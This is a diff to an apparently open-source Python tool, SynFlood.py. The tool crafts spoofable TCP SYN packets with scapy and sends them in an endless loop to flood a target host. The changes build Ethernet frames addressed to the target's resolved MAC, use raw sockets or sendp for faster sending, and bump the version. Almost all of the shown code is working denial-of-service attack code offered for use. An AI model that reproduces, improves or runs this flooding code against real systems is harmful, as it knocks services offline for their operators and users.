@@ -50,7 +50,7 @@ KeyboardInterrupt
 [2016-06-22 12:35:25] CRITICAL (50) {__main__ - SynFlood.py:199} End of the SynFlood attack.
 """
 
-__version__ = "1.1.2"
+__version__ = "1.1.3"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -79,9 +79,10 @@ from scapy.all import (
     RandShort,
     Raw,
     Ether,
-    send,
+    sendp,
     conf,
     IFACES,
+    getmacbyip,
 )
 from logging import StreamHandler, Formatter, Logger, getLogger, DEBUG, WARNING
 from argparse import ArgumentParser, Namespace
@@ -233,29 +234,29 @@ def synflood(
     This function implements the SynFlood attack.
     """
 
-    logger_debug("Build the packet...")
-    packet = IP(dst=target, src=source) / TCP(dport=dport, sport=sport)
-
-    logger_debug("Build send function...")
-    if IS_LINUX:
-        packet = Ether() / packet
-        sock = socket(AF_PACKET, SOCK_RAW)
-        try:
-            sock.bind((iface.ip, 0))
-        except OSError:
-            send_ = partial(send, iface=iface, verbose=0)
-        else:
-           send_ = sock.send
-    else:
-        send_ = partial(send, iface=iface, verbose=0)
+    logger_debug("Craft the packet...")
+    packet = Ether(src=iface.mac, dst=getmacbyip(target)) / IP(dst=target, src=source) / TCP(dport=dport, sport=sport)
 
     logger_debug("Add raw data...")
     if data:
         packet = packet / Raw(data)
 
+    logger_debug("Get an optimized sending function...")
     if IS_LINUX:
-        logger_debug("Get packet as bytes...")
-        packet = bytes(packet)
+        sock = socket(AF_PACKET, SOCK_RAW)
+        try:
+            sock.bind((iface.ip, 0))
+        except OSError:
+            logger_warning("Bind socket failed. Use scapy send function (slower)...")
+            send_ = partial(sendp, iface=iface, verbose=0)
+        else:
+            packet = packet
+            send_ = sock.send
+            
+            logger_debug("Get packet as bytes...")
+            packet = bytes(packet)
+    else:
+        send_ = partial(sendp, iface=iface, verbose=0)
 
     logger_warning("Start the SynFlood attack...")
     while True:
